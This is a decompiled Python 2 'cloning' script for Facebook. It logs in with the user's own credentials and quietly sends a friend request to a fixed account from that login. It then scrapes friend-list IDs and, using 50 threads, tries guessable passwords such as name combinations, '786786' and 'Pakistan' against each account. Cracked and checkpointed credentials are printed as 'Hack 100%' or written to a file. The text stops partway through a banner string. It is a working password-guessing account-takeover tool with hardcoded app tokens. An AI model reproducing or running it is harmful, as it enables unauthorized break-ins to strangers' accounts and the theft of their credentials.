
# Python Auto Dis Parser 1.0.1
# Author : HTR-TECH | TAHMID RAYAT
# https://linktr.ee/tahmid.rayat
# https://fb.me/tahmid.rayat.official
# ------------------------------------------
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: Sumarr ID
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo = '\n \x1b[1;96m ------------------------\n \x1b[1;32m < OFFICIAL CODER MEHEDI >\n \x1b[1;96m ------------------------\n\x1b[1;96m\n  =====================================================\n                    ASSALAMU ALAIKUM                    \n            Coded By : MEHEDI HASAN ARIYAN       \n                 Facebook : fb.com/TheMehtan                \n            Youtube : youtube.com/MasterTrick1     \n                Website : www.BanglarTrick.xyz            \n     ---------------    ---------------    ------------  \n                    Team V-VIRUS [ TVV ]                     \n  =====================================================\n\x1b[1;32m _    _       __  __\n \x1b[1;32m\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x95\xae\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\xa3\xe2\x95\xaf\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x95\xad\xe2\x95\xae\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\n\x1b[1;32m\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[1;97m------------------------------------+-----------------'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print '\n \x1b[1;96m ------------------------\n \x1b[1;32m < OFFICIAL CODER MEHEDI >\n \x1b[1;96m ------------------------\n\x1b[1;96m\n  =====================================================\n                    ASSALAMU ALAIKUM                    \n            Coded By : MEHEDI HASAN ARIYAN       \n                 Facebook : fb.com/TheMehtan                \n            Youtube : youtube.com/MasterTrick1     \n                Website : www.BanglarTrick.xyz            \n    ---------------    ---------------    ------------  \n                    Team V-VIRUS [ TVV ]                     \n  =====================================================\n\x1b[1;97m\n------------------------------------+-----------------\n \x1b[1;32m _    _       __  __\n \x1b[1;32m\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x95\xae\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x95\xad\xe2\x95\xae\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\xa3\xe2\x95\xaf\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xad\xe2\x94\x81\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x95\xad\xe2\x95\xae\n\x1b[1;32m\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb1\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\xe2\x95\xb0\xe2\x94\x81\xe2\x95\xaf\xe2\x94\x83\n\x1b[1;32m\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[1;97m------------------------------------+-----------------'
jalan('\x1b[1;96m---> \x1b[1;32mWelcome To My Cloning Tools')
jalan('\x1b[1;96m---> \x1b[1;32mIf You Have Any Problem You Can Contact On Facebook')
jalan('\x1b[1;96m---> \x1b[1;32mFacebook Page : facebook.com/TheMehtan')
jalan('\x1b[1;96m---> \x1b[1;32mBangladeshi BOTOL')
jalan('\x1b[1;96m---> \x1b[1;32mPROUD TO BE A MUSLIM PROUD TO BE A BOTOL')
jalan('\x1b[1;96m---> \x1b[1;32m TEAM VVIRUS \x1b[1;31m[ TVV ]')
print '\x1b[1;96m----->\x1b[1;32mTOOL LOGIN \x1b[1;96m<-----'
CorrectUsername = 'botol'
CorrectPassword = 'botol'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;34mTool Username \x1b[1;31m---> \x1b[1;32m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;34mTool Password \x1b[1;31m---> \x1b[1;32m')
        if password == CorrectPassword:
            print '\x1b[1;32mACCESS GRANTED AS ' + username
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;31mACCESS DENIED'
            os.system('xdg-open https://www.youtube.com/channel/UCHrEAeRj-txxabetgTPrb2g')
    else:
        print '\x1b[1;31mACCESS DENIED'
        os.system('xdg-open https://www.youtube.com/channel/UCHrEAeRj-txxabetgTPrb2g')

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        jalan(' \x1b[1;31m---> \x1b[1;93mWarning: \x1b[1;96mDONOT USE WIFI.THIS WILL WORK ONLY ON MOBILE DATA')
        jalan(' \x1b[1;31m---> \x1b[1;93mWarning: \x1b[1;96mUse a New Account To Login')
        jalan(' \x1b[1;31m---> \x1b[1;93mWarning: \x1b[1;31mEDITING MY SCRIPT WILL NOT MAKE YOU A BOTOL\xe2\x9c\x85')
        jalan(' \x1b[1;31m---> \x1b[1;96m IM NOT HARE TO PLAY THE GAME, IM HARE TO JUDGE THE PLAYERS ')
        jalan(' \x1b[1;32m---> \x1b[1;96m RESPECT YOUR BOSS, I MEAN RESPECT BOTOL MEHEDI')
        jalan(' \x1b[1;97m--------------------------------------------------')
        print '\t   \x1b[1;97m~~~\x1b[1;94m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2LOGIN WITH FACEBOOK\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;97m~~~'
        print '\t'
        id = raw_input('\x1b[1;96m[+] \x1b[1;94mID/Email\x1b[1;32m: \x1b[1;32m')
        pwd = raw_input('\x1b[1;96m[+] \x1b[1;94mPassword\x1b[1;32m: \x1b[1;32m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;97mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2>Login Successful<\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2'
                os.system('xdg-open https://wa.me/+923097992202')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;31mThere is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;31mYour Account is on Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;94mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;94mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;97mYour Account is on Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;94mThere is no internet connection'
        keluar()

    os.system('clear')
    print logo
    print '  \x1b[1;32m\xea\xa7\x81\x1b[1;96mLogged in User Info\x1b[1;32m\xea\xa7\x82'
    print '\t   \x1b[1;97m Name\x1b[1;97m:\x1b[1;94m' + nama + '\x1b[1;97m               '
    print '\t   \x1b[1;97m ID\x1b[1;97m:\x1b[1;94m' + id + '\x1b[1;97m              '
    print '\x1b[1;32m<-----\x1b[1;93mMEHEDI\xe3\x8b\xa1 UPGRADE BOTOL\xe3\x8b\xa1\x1b[1;32m----->'
    print '\x1b[1;97m-------------------------------'
    print '\x1b[1;32m\xe2\x9e\xa5\x1b[1;32m1.\x1b[1;96mStart Cloning\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2'
    print '\x1b[1;97m\xe2\x9e\xa5\x1b[1;97m0.\x1b[1;97mlogout            '
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;96mChoose an Option>>> \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;97mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;94mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;32m\xe2\x9e\xa5\x1b[1;32m1.\x1b[1;96mClone From Friend List.'
    print '\x1b[1;32m\xe2\x9e\xa5\x1b[1;32m2.\x1b[1;96mClone Friend List Public ID.'
    print '\x1b[1;32m\xe2\x9e\xa5\x1b[1;31m0.\x1b[1;97mBack'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;96mChoose an Option>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;94mFill in correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '\x1b[1;32m<-----\x1b[1;93mMEHEDI \xe2\x80\xa2 YOUR UNKNOWN ASS KICKER BROTHER OF YOUR UNKNOWN SISTER \xe3\x8b\xa1 BOTOL\xe2\x80\xa2MEHEDI\xe3\x8b\xa1\x1b[1;32m----->'
            jalan('\x1b[1;94mGetting IDs \x1b[1;94m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;32m\xe2\x9e\xa5\x1b[1;94mEnter ID\x1b[1;33m: \x1b[1;97m')
            print '\x1b[1;32m<-----\x1b[1;93mMEHEDI \xe2\x80\xa2 YOUR UNKNOWN ASS KICKER BROTHER OF YOUR UNKNOWN SISTER \xe3\x8b\xa1 BOTOL\xe2\x80\xa2MEHEDI\xe3\x8b\xa1\x1b[1;32m----->'
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97mName\x1b[1;97m:\x1b[1;96m ' + op['name']
            except KeyError:
                print '\x1b[1;97mID Not Found!'
                raw_input('\n\x1b[1;97m[\x1b[1;93mBack\x1b[1;97m]')
                super()

            print '\x1b[1;94mGetting IDs\x1b[1;97m...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;97mFill in correctly'
            pilih_super()
        print '\x1b[1;97mTotal IDs\x1b[1;97m: \x1b[1;94m' + str(len(id))
        jalan('\x1b[1;94mPlease Wait\x1b[1;94m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;94mCloning\x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;32m<-------\x1b[1;93m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2Stop Process Press CTRL+Z\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;32m------->'
    print '\x1b[1;32m<-----\x1b[1;93mMEHEDI\xe3\x8b\xa1 BOTOL\xe2\x80\xa2MEHEDI\xe3\x8b\xa1\x1b[1;32m----->'
    jalan(' \x1b[1;97m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\x1b[1;93mCloning Start..\x1b[1;97m\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2 ')
    jalan(' \x1b[1;32m<-----\x1b[1;93mMEHEDI\xe3\x8b\xa1 BOTOL\xe2\x80\xa2MEHEDI\xe3\x8b\xa1\x1b[1;32m----->')
    jalan(' \x1b[1;97m-----------------------------------')

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + b['last_name']
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92mHack 100%\xf0\x9f\x92\x89\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass1
                cek = open('out/checkpoint.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92mHack 100%\xf0\x9f\x92\x89\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass2
                    cek = open('out/checkpoint.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Pakistan'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92mHack 100%\xf0\x9f\x92\x89\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass3
                        cek = open('out/checkpoint.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['first_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92mHack 100%\xf0\x9f\x92\x89\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass4
                            cek = open('out/checkpoint.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['first_name'] + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92mHack 100%\xf0\x9f\x92\x89\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass5
                                cek = open('out/checkpoint.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['first_name'] + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92mHack 100%\xf0\x9f\x92\x89\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass6
                                    cek = open('out/checkpoint.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                    b = json.loads(a.text)
                                    pass7 = b['first_name'] + '786'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92mHack 100%\xf0\x9f\x92\x89\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass7
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;96mCheckpoint\x1b[1;97m-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + user + '-\x1b[1;96m\xe2\x96\xac\x1b[1;97m-' + pass7
                                        cek = open('out/checkpoint.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(50)
    p.map(main, id)
    print '\x1b[1;32m<-----\x1b[1;93mHack The World, Because Nothing Is Personal\xe3\x8b\xa1 BOTOL MEHEDI \xe3\x8b\xa1\x1b[1;32m----->'
    print '  \x1b[1;93m<-----Developed By Mehedi Hasan Ariyan----->'
    print '\x1b[1;96m\xe2\x9c\x85Process Has Been Completed Press\xe2\x9e\xa1 Ctrl+Z.\xe2\x86\xa9 Next Type (python2 bclone.py)\xe2\x86\xa9\x1b[1;97m....'
    print '\x1b[1;92mTotal OK/\x1b[1;93mCP \x1b[1;93m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\n\t\n\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\xa0\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x9